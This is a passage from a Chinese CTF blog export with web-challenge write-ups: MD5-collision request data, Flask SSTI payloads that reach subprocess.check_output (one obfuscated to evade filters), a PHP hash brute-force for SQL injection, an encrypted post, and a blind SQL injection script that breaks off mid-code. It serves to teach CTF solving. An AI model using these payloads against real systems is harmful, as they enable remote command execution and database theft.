%9C%3F%0E%F7%8E%AD%4B%5D%92%FF%DB%38%3C%52%6E%43%79%4B%8C%BE%CD%76%F3%F2%EC%C0%47%EB%F4%6B%FC%E3%DA%FF%FB%F8%8F%DA%DC%35%88%80%05%E6%6C%25%3E%47%4A%84%8C%DF%B6%9A%27%6A%0E%95%52%01%D1%57%E9%7F%2F%C5%75%CB%0E%DA%2D%7D%1D%2F%E6%2D%61%D3%1A%76%B7%EC%46%FE%E7%4E%7D%46%59%F4%4F%E0%8F%7A%5E%5D%EF%C0%AC%15%EB%2A%10%1B%D6%8B%1C%16%D2%F8%8E%93%43%0F%93%72%5C&amp;m[]=8c8d357b5e872bbacd45197626bd5759&amp;n[]=523af537946b79c4f8369ed39ba78605</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">val5=%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A&amp;val6=%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A&amp;val7=%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A&amp;a=byGcY&amp;b=aOtm2</span><br></pre></td></tr></table></figure>

<p>即可拿到flag</p>
<p><a href="[http://www.gtfly.top/2019/04/07/%E6%8E%98%E5%AE%89%E6%9D%AFwp.html#audit](http://www.gtfly.top/2019/04/07/掘安杯wp.html#audit)">参考链接</a></p>
<h1 id="easyflask1"><a href="#easyflask1" class="headerlink" title="easyflask1"></a>easyflask1</h1><p>给出提示，应该是ssti</p>
<p>在404页面注入</p>
<p><img src="/pic/123.png" alt=""></p>
<p>经过测试过滤了<code>-</code>,<code>.</code>。</p>
<p>参考链接<a href="https://fireshellsecurity.team/asisctf-fort-knox" target="_blank" rel="noopener">https://fireshellsecurity.team/asisctf-fort-knox</a></p>
<p>操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[1].__subclasses__()[&#39;&#39;&#39;找到warnings.catch_warnings&#39;&#39;&#39;].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;subprocess&#39;).check_output(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p>114师傅的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##payload不需要这么长，可以连续格式化字符串，也可以只把_和.用格式化字符串替代</span><br><span class="line">#没找到flag，先看目录，发现start.sh可读</span><br><span class="line">&#123;&#123;&#39;&#39;[&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;mro&#39;]()[1][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](101)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)]()[65][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](103)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](109)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](112)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](114)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)](&#39;subprocess&#39;)[&#39;check&#39;+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;output&#39;]([&#39;ls&#39;,&#39;&#x2F;&#39;])&#125;&#125;</span><br><span class="line">#读取start.sh中存在sed -i &quot;s&#x2F;1ad0633b78d14695b04f105c14674b0d4&#x2F;$1&#x2F;g&quot; &#x2F;flag\n</span><br><span class="line">&#123;&#123;&#39;&#39;[&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;mro&#39;]()[1][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](101)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)]()[231][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](103)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](109)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](112)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](114)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)](&#39;subprocess&#39;)[&#39;check&#39;+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;output&#39;]([&#39;cat&#39;,&#39;&#x2F;start&#39;+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](46)+&#39;sh&#39;])&#125;&#125;</span><br></pre></td></tr></table></figure>





<h1 id="HashIsTrue"><a href="#HashIsTrue" class="headerlink" title="HashIsTrue"></a>HashIsTrue</h1><p>给了提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注意如下题目内容：$pw &#x3D; hash(&quot;whirlpool&quot;,$pass,true); $sql &#x3D; &quot;select * from user where username&#x3D;&#39;$user&#39; and password&#x3D;&#39;$pw&#39;&quot;;</span><br></pre></td></tr></table></figure>

<p> hash(“whirlpool”,$pass,true)当hash函数开启true时，会返回字符串，而不是16进制。</p>
<p>可以制造MD5后的包含‘= ’ (没有想通)</p>
<p>编写脚本参考着114师傅</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;;$i++)</span><br><span class="line">&#123;</span><br><span class="line">    $pass=$i;</span><br><span class="line">    $pw = hash(<span class="string">"whirlpool"</span>,$pass,<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\'=\'/'</span>,$pw ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $i;</span><br><span class="line">        <span class="keyword">echo</span> urldecode(<span class="string">'%09'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $pw;</span><br><span class="line">        <span class="keyword">echo</span> urldecode(<span class="string">'%0a'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>比赛记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>关于云之家的分析</title>
    <url>/2020/02/25/%E5%85%B3%E4%BA%8E%E4%BA%91%E4%B9%8B%E5%AE%B6%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
<div id="enc_content" style="display:none">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</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
	document.getElementById("enc_error").innerHTML = "password error!"
};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
  </entry>
  <entry>
    <title>ichunqiu公益赛web</title>
    <url>/2020/02/21/ichunqiu%E5%85%AC%E7%9B%8A%E8%B5%9Bweb/</url>
    <content><![CDATA[<h1 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h1><p>打开题目是一个登入界面，是NULL的大佬出的题目</p>
<a id="more"></a>

<p><img src="/pic/107.png" alt=""></p>
<p>简单的注册admin,admin登入，发现在Profile界面发现存在<del>xss</del>slelf-xss 还有一个admin界面，提示需要admin才能访问，不过只能获取自己cookie。这是一个坑。</p>
<p>实在是想不到怎么办。</p>
<p>后面想到登入界面可能存在注入,经过测试确实存在sql注入</p>
<p><img src="/pic/109.png" alt=""></p>
<p>编写脚本，在里面有坑，编码不一样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 1/30/2020 9:42 PM</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get(payload):</span><br><span class="line">    url = <span class="string">'http://3f5788fc3e0d4cd29c4857bd75a3087e9c2af7a010664d15.changame.ichunqiu.com/index.php'</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'lname'</span> : <span class="string">'admin\' and '</span>+payload+<span class="string">'#'</span>,</span><br><span class="line">        <span class="string">'lpass'</span> : <span class="string">'admin'</span></span><br><span class="line">    &#125;</span><br><span class="line">    cookies=&#123;</span><br><span class="line">        <span class="string">'PHPSESSID'</span> : <span class="string">'bbvvjmdnv20oa9vpub65s4bkr4'</span>,</span><br><span class="line">        <span class="string">'__jsluid_h'</span> : <span class="string">'a36781563be2b33ed295cec9257f1621'</span></span><br><span class="line">    &#125;</span><br><span class="line">    html = requests.post(url,data=data,cookies=cookies)</span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">def binsea(s_payload,len=<span class="number">999</span>):</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line"></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span 